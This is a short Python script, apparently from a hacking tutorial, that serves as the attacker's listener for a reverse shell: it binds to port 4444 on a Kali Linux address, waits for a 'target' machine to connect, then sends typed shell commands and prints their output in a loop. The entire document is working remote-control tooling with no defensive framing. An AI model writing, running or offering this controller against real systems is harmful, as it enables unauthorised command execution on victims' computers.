
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

s.bind(("192.168.1.7" , 4444))  # first parameter is your Kali Linux IP address
s.listen(5)

print("[+] Listening For Incoming Connections")

target,ip = s.accept()
print("[+] Target Connected!")


while True:
	command = input("* Shell#~%s: " % str(ip))
	target.send(command.encode())
	if command == "q":
		break
	result = target.recv(2048).decode()
	print(result)

target.close()
s.close()
